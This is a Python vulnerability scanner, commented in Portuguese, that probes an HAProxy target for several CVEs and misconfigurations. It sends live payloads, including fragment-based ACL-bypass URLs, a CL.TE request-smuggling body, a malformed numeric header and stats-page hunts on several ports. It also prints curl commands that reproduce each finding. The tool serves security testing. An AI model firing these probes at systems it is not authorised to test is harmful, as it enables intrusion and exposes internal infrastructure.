#!/usr/bin/env python3
"""
haproxy_cve.py - Detecção de CVEs em HAProxy
Uso: python3 haproxy_cve.py <url> [--no-oob]
Resultado consolidado: cve_results.txt

CVEs cobertas:
  CVE-2023-45539  — ACL Bypass via URI fragment (#)
  CVE-2021-40346  — HTTP Request Smuggling (header numérico)
  CVE-2024-45506  — DoS via HTTP/2 CONTINUATION frame (HAProxy 2.9.x)
  CVE-2023-44487  — HTTP/2 Rapid Reset
  CVE-2022-0711   — Loop infinito via cabeçalho WWW-Authenticate malformado
  MISC-HA-001     — Stats page exposta sem autenticação
  MISC-HA-002     — Versão exposta no header Server
  MISC-HA-003     — Backend info leak via respostas de erro
"""

import sys
import time
import argparse
import re

try:
    from cve_base import (
        curl, curl_header_value,
        InteractshSession, ResultCollector,
        log, OUTPUT_FILE, INTERACTSH_WAIT,
    )
except ImportError:
    print("[ERR] cve_base.py não encontrado no mesmo diretório.")
    sys.exit(1)


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def _base(url):
    return url.rstrip("/")


def _confirm_haproxy(url):
    """
    Confirma HAProxy e extrai versão.
    Retorna (is_haproxy, version_str).
    """
    status, hdrs, body, _ = curl(url)
    server = curl_header_value(hdrs, "Server").lower()

    # Header direto
    if "haproxy" in server:
        m = re.search(r"haproxy/([\d.]+)", server)
        ver = m.group(1) if m else "?"
        log(f"HAProxy confirmado via header Server: haproxy/{ver}", "OK")
        return True, ver

    # Via página de erro padrão do HAProxy
    status2, _, body2, _ = curl(_base(url) + "/____probe____")
    if "haproxy" in body2.lower():
        m = re.search(r"haproxy/([\d.]+)", body2.lower())
        ver = m.group(1) if m else "?"
        log(f"HAProxy confirmado via body de erro: haproxy/{ver}", "OK")
        return True, ver

    # Via stats page padrão
    for stats_path in ["/stats", "/_haproxy_stats"]:
        s3, _, body3, _ = curl(_base(url) + stats_path)
        if s3 == 200 and "haproxy" in body3.lower():
            m = re.search(r"haproxy ([\d.]+)", body3.lower())
            ver = m.group(1) if m else "?"
            log(f"HAProxy confirmado via stats page: haproxy/{ver}", "OK")
            return True, ver

    log("HAProxy NÃO confirmado — continuando mesmo assim", "WARN")
    return False, "?"


def _version_tuple(ver_str):
    try:
        return tuple(int(x) for x in ver_str.split("."))
    except Exception:
        return (0, 0, 0)


# ──────────────────────────────────────────────
# CVE CHECKS
# ──────────────────────────────────────────────

def check_cve_2023_45539(url, collector):
    """
    CVE-2023-45539 — HAProxy ACL Bypass via URI fragment (#)
    Versões afetadas: < 2.8.4 / < 2.9.0
    HAProxy ignora tudo após '#' na URI — bypassando regras de ACL
    que bloqueiam /admin, /internal, etc.
    """
    cve = "CVE-2023-45539"
    log(f"Testando {cve} em {url}", "INFO")

    protected_paths = ["/admin", "/internal", "/private", "/api/admin", "/management"]

    for path in protected_paths:
        target = _base(url) + path

        # Baseline sem fragment
        status_base, _, body_base, _ = curl(target)

        # Com fragment — HAProxy pode encaminhar para backend diferente
        bypass_variants = [
            f"{target}#/../public",
            f"{target}#/bypass",
            f"{target}#%0a",          # newline encoding
            f"{_base(url)}/#/{path.lstrip('/')}",
        ]

        for bypass_url in bypass_variants:
            status, _, body, _ = curl(bypass_url)

            # Bypass confirmado: base era 401/403, agora 200 com conteúdo diferente
            if status == 200 and status_base in (401, 403, 404):
                repro = (
                    f'# Baseline (bloqueado):\n'
                    f'curl -v "{target}"\n\n'
                    f'# Bypass via fragment:\n'
                    f'curl -v "{bypass_url}"'
                )
                collector.add(url, cve, "VULNERABLE",
                              detail=f"ACL bypass em {path} — {status_base} → {status} via fragment",
                              curl_repro=repro)
                return

            # Respostas diferentes indicam tratamento diferente da URI
            if status != status_base and status == 200:
                repro = f'curl -v "{bypass_url}"'
                collector.add(url, cve, "VULNERABLE",
                              detail=f"Comportamento diferente com fragment em {path} ({status_base} → {status})",
                              curl_repro=repro)
                return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum ACL bypass via fragment detectado")


def check_cve_2021_40346(url, collector):
    """
    CVE-2021-40346 — HTTP Request Smuggling via Content-Length numérico
    HAProxy aceita header com nome numérico que backends ignoram,
    causando dessincronização CL.TE.
    Versões afetadas: 2.0.x < 2.0.25, 2.2.x < 2.2.17, 2.3.x < 2.3.14, 2.4.x < 2.4.4
    """
    cve = "CVE-2021-40346"
    log(f"Testando {cve} em {url}", "INFO")

    # Probe 1: header numérico que HAProxy não filtra
    status1, hdrs1, body1, _ = curl(
        url,
        method="POST",
        headers={
            "Content-Length": "0",
            "0x12": "34 Content-Length: 56",     # header numérico malformado
        },
        data="",
    )

    # Probe 2: CL.TE clássico
    status2, hdrs2, body2, _ = curl(
        url,
        method="POST",
        headers={
            "Content-Length": "13",
            "Transfer-Encoding": "chunked",
        },
        data="0\r\n\r\nGET /admin HTTP/1.1\r\n",
    )

    # Baseline para /admin
    status_admin, _, _, _ = curl(_base(url) + "/admin")

    # Indício de smuggling: resposta 200 em /admin que normalmente é 403/404
    if status2 == 200 and status_admin in (401, 403, 404) and len(body2) > 100:
        repro = (
            f'# CL.TE Smuggling:\n'
            f'curl -v \\\n'
            f'  -H "Content-Length: 13" \\\n'
            f'  -H "Transfer-Encoding: chunked" \\\n'
            f'  --data $\'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n\' \\\n'
            f'  "{url}"\n\n'
            f'# Header numérico (CVE-2021-40346 específico):\n'
            f'curl -v \\\n'
            f'  -H "Content-Length: 0" \\\n'
            f'  -H "0x12: 34 Content-Length: 56" \\\n'
            f'  "{url}"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="Request smuggling CL.TE — resposta anômala em /admin",
                      curl_repro=repro)
        return

    # Indício mais leve: servidor aceita header numérico sem rejeitar
    if status1 not in (400, 0) and "haproxy" not in body1.lower():
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Header numérico aceito sem rejeição (HTTP {status1}) — validar manualmente",
                      curl_repro=(
                          f'curl -v \\\n'
                          f'  -H "Content-Length: 0" \\\n'
                          f'  -H "0x12: 34 Content-Length: 56" \\\n'
                          f'  "{url}"'
                      ))
        return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail=f"Sem indício de smuggling (CL.TE={status2}, header_num={status1})")


def check_cve_2024_45506(url, collector, haproxy_ver):
    """
    CVE-2024-45506 — DoS via HTTP/2 CONTINUATION frame malformado
    Versões afetadas: HAProxy 2.9.x < 2.9.9
    Detecção: versão + HTTP/2 ativo (DoS real não é executado)
    """
    cve = "CVE-2024-45506"
    log(f"Testando {cve} em {url}", "INFO")

    if haproxy_ver == "?":
        # Tenta detectar via HTTP/2 mesmo sem versão
        status, hdrs, _, _ = curl(url, extra_flags="--http2")
        if "HTTP/2" in hdrs:
            collector.add(url, cve, "VULNERABLE",
                          detail="HTTP/2 ativo e versão não identificada — verificar se < 2.9.9",
                          curl_repro=f'curl -v --http2 "{url}"')
        else:
            collector.add(url, cve, "SKIPPED",
                          detail="Versão não identificada e HTTP/2 não detectado")
        return

    vt = _version_tuple(haproxy_ver)

    # Afeta 2.9.x < 2.9.9
    if vt[:2] == (2, 9) and vt < (2, 9, 9):
        status, hdrs, _, _ = curl(url, extra_flags="--http2")
        if "HTTP/2" in hdrs:
            repro = (
                f'# HAProxy {haproxy_ver} com HTTP/2 — vulnerável a CONTINUATION DoS\n'
                f'curl -v --http2 "{url}"\n'
                f'# DoS real requer ferramenta especializada (não executar)'
            )
            collector.add(url, cve, "VULNERABLE",
                          detail=f"haproxy/{haproxy_ver} < 2.9.9 com HTTP/2 ativo — CONTINUATION DoS",
                          curl_repro=repro)
        else:
            collector.add(url, cve, "NOT_VULNERABLE",
                          detail=f"haproxy/{haproxy_ver} na faixa afetada mas HTTP/2 não ativo")
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"haproxy/{haproxy_ver} não na faixa 2.9.x < 2.9.9")


def check_cve_2023_44487(url, collector):
    """CVE-2023-44487 — HTTP/2 Rapid Reset"""
    cve = "CVE-2023-44487"
    log(f"Testando {cve} em {url}", "INFO")

    status, hdrs, _, _ = curl(url, extra_flags="--http2")
    if "HTTP/2" in hdrs:
        repro = (
            f'curl -v --http2 "{url}"\n'
            f"# HTTP/2 ativo — RST_STREAM flood via h2load ou wrk2"
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="HTTP/2 habilitado — suscetível a Rapid Reset",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE", detail="HTTP/2 não detectado")


def check_cve_2022_0711(url, collector):
    """
    CVE-2022-0711 — Loop infinito via WWW-Authenticate malformado
    HAProxy < 2.6.1: header WWW-Authenticate com valor vazio causa loop.
    Detecção: verifica versão afetada (não dispara DoS real)
    """
    cve = "CVE-2022-0711"
    log(f"Testando {cve} em {url}", "INFO")

    # Detecta versão via header ou stats
    status, hdrs, body, _ = curl(url)
    server = curl_header_value(hdrs, "Server").lower()
    m = re.search(r"haproxy/([\d.]+)", server)
    ver = m.group(1) if m else "?"

    if ver == "?":
        collector.add(url, cve, "SKIPPED", detail="Versão não identificada")
        return

    vt = _version_tuple(ver)
    if vt < (2, 6, 1):
        repro = (
            f'# HAProxy {ver} vulnerável — WWW-Authenticate loop\n'
            f'# Verificar se proxy autentica requests com header WWW-Authenticate\n'
            f'curl -v -H "Authorization: Basic dGVzdA==" "{url}"\n'
            f'# DoS real: enviar resposta com WWW-Authenticate vazio do backend'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail=f"haproxy/{ver} < 2.6.1 — loop via WWW-Authenticate",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"haproxy/{ver} >= 2.6.1")


def check_stats_page(url, collector):
    """
    MISC-HA-001 — Stats page exposta sem autenticação
    Expõe: versão, backends, IPs internos, conexões ativas, saúde dos servidores
    """
    cve = "MISC-HA-001"
    log(f"Testando {cve} (stats page) em {url}", "INFO")

    m = re.match(r"(https?://[^/:]+)", url)
    host_base = m.group(1) if m else url

    stats_endpoints = [
        f"{_base(url)}/stats",
        f"{_base(url)}/_haproxy_stats",
        f"{_base(url)}/haproxy_stats",
        f"{_base(url)}/admin/stats",
        f"{host_base}:8404/stats",    # porta padrão stats HAProxy 2.x
        f"{host_base}:9000/stats",
        f"{host_base}:1936/stats",    # porta alternativa comum
    ]

    found = []
    for endpoint in stats_endpoints:
        status, _, body, _ = curl(endpoint)
        if status == 200 and re.search(
            r"haproxy|statistics|frontend|backend|sessions|queue",
            body, re.IGNORECASE
        ):
            found.append(endpoint)

    if found:
        repro_lines = [f'curl -v "{ep}"' for ep in found]
        detail_info = []
        # Tenta extrair info da primeira stats page
        _, _, body_stats, _ = curl(found[0])
        if re.search(r"haproxy/([\d.]+)", body_stats, re.IGNORECASE):
            m2 = re.search(r"haproxy/([\d.]+)", body_stats, re.IGNORECASE)
            detail_info.append(f"versão: {m2.group(1)}")
        if re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", body_stats):
            detail_info.append("IPs internos expostos")

        collector.add(url, cve, "VULNERABLE",
                      detail=f"Stats page acessível: {', '.join(found)} — {'; '.join(detail_info)}",
                      curl_repro="\n".join(repro_lines))
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail="Stats page não exposta")


def check_version_disclosure(url, collector, haproxy_ver):
    """
    MISC-HA-002 — Versão HAProxy exposta no header Server
    Versão exposta facilita identificação de CVEs aplicáveis
    """
    cve = "MISC-HA-002"
    log(f"Testando {cve} (version disclosure) em {url}", "INFO")

    if haproxy_ver != "?":
        repro = f'curl -v -I "{url}" | grep -i server'
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Versão exposta no header Server: haproxy/{haproxy_ver}",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail="Versão não exposta no header Server")


def check_backend_info_leak(url, collector):
    """
    MISC-HA-003 — Backend info leak via respostas de erro HAProxy
    Erros 503/502 do HAProxy expõem info sobre backends internos
    """
    cve = "MISC-HA-003"
    log(f"Testando {cve} (backend info leak) em {url}", "INFO")

    # Provoca erro de backend com requests malformados
    probes = [
        (_base(url) + "/____nonexistent____backend____", "GET", {}),
        (url, "GET", {"Host": "nonexistent.internal.backend.invalid"}),
        (url, "GET", {"Connection": "close", "X-Forwarded-Host": "127.0.0.1:65535"}),
    ]

    backend_patterns = [
        r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4,5}\b",  # IP:porta interno
        r"10\.\d+\.\d+\.\d+",                                   # RFC1918
        r"172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
        r"192\.168\.\d+\.\d+",
        r"backend|upstream|server.*down",
        r"no server available",
    ]

    for probe_url, method, headers in probes:
        status, hdrs, body, _ = curl(probe_url, method=method, headers=headers)
        if status in (502, 503, 504):
            for pattern in backend_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    repro = f'curl -v "{probe_url}"'
                    collector.add(url, cve, "VULNERABLE",
                                  detail=f"Info de backend interno exposta em erro {status}",
                                  curl_repro=repro)
                    return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhuma info de backend exposta em erros")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="haproxy_cve.py — Detecção de CVEs em HAProxy"
    )
    parser.add_argument("url", help="URL alvo (ex: https://sub.exemplo.com)")
    parser.add_argument(
        "--no-oob", action="store_true",
        help="Desativa testes OOB (interactsh)"
    )
    parser.add_argument(
        "--output", default=OUTPUT_FILE,
        help=f"Arquivo de saída consolidado (padrão: {OUTPUT_FILE})"
    )
    args = parser.parse_args()

    url       = args.url.rstrip("/")
    collector = ResultCollector(output_file=args.output)

    print(f"\n{'═'*60}")
    print(f"  haproxy_cve.py — Alvo: {url}")
    print(f"{'═'*60}\n")

    # Confirma servidor
    is_haproxy, haproxy_ver = _confirm_haproxy(url)

    # Inicia interactsh (usado em smuggling OOB futuro)
    iactsh = None
    if not args.no_oob:
        iactsh = InteractshSession()
        if not iactsh.start():
            iactsh = None
            log("Continuando sem OOB (interactsh indisponível)", "WARN")

    try:
        log("── HAProxy CVEs ──", "INFO")
        check_cve_2023_45539(url, collector)
        check_cve_2021_40346(url, collector)
        check_cve_2024_45506(url, collector, haproxy_ver)
        check_cve_2023_44487(url, collector)
        check_cve_2022_0711(url, collector)

        log("── HAProxy Info / Misconfig ──", "INFO")
        check_stats_page(url, collector)
        check_version_disclosure(url, collector, haproxy_ver)
        check_backend_info_leak(url, collector)

    finally:
        if iactsh:
            iactsh.stop()

    collector.save()

    s = collector.summary()
    print(f"\n{'═'*60}")
    print(f"  HAProxy CVE Scan — {url}")
    print(f"  Versão detectada: haproxy/{haproxy_ver}")
    print(f"  Testes: {s['total']}  |  Vulneráveis: {s['vulnerable']}")
    if s["vulns"]:
        print(f"\n  !! CVEs ENCONTRADAS:")
        for v in s["vulns"]:
            print(f"     • {v['cve']} — {v['detail']}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()
